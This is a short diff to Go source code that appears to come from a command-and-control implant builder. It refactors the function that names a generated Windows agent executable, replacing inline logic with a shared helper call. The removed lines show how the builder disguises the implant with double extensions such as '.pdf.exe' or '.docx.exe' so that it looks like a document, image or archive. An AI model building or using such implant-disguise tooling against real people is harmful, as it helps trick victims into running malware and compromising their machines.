@@ -66,36 +66,8 @@ func GenerateWindowsEXE(cfg ImplantConfig, outputDir string) (string, error) {
 	if outName == "" {
 		outName = "forgec2_agent.exe"
 	}
-	disguiseExt := ""
-	switch strings.ToLower(cfg.DisguiseAs) {
-	case "jpg", "jpeg":
-		disguiseExt = ".jpg"
-	case "pdf":
-		disguiseExt = ".pdf"
-	case "doc", "word", "docx":
-		disguiseExt = ".docx"
-	case "xls", "xlsx":
-		disguiseExt = ".xlsx"
-	case "zip":
-		disguiseExt = ".zip"
-	case "folder":
-		disguiseExt = "" // folder has no double ext
-	}
-	if disguiseExt != "" && !strings.Contains(strings.ToLower(outName), disguiseExt) {
-		base := strings.TrimSuffix(outName, ".exe")
-		base = strings.TrimSuffix(base, ".EXE")
-		// also strip any existing disguise ext to avoid duplication
-		for _, ext := range []string{".jpg", ".jpeg", ".pdf", ".docx", ".doc", ".xlsx", ".xls", ".zip"} {
-			if strings.HasSuffix(strings.ToLower(base), ext) {
-				base = base[:len(base)-len(ext)]
-				break
-			}
-		}
-		outName = base + disguiseExt + ".exe"
-	}
-	if !strings.HasSuffix(strings.ToLower(outName), ".exe") {
-		outName += ".exe"
-	}
+	// Disguise filename via the shared helper (single source of truth).
+	outName = ApplyDisguiseFilename(outName, cfg.DisguiseAs)
 	// Strip any directory components so a user-supplied filename containing
 	// ".." or an absolute path cannot write outside outputDir (A1).
 	outName = safeBuildFileName(outName)
